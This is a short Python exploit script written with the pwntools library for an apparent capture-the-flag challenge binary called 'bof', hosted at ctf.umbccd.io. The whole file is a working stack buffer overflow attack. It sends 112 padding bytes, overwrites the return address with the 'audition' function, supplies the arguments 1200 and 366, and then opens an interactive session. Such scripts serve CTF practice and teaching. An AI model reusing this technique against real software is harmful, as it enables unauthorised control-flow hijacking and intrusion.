#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('./bof')

host = args.HOST or 'ctf.umbccd.io'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

io = start()
io.recvuntil("What's your name?\n")
io.sendline("A")

io.recvuntil("What song will you be singing?\n")

payload = (
    b"A" * 112 +
    p32(exe.functions["audition"].address) +
    b"BBBB" +
    p32(1200) +
    p32(366)
)
io.sendline(payload)

io.interactive()
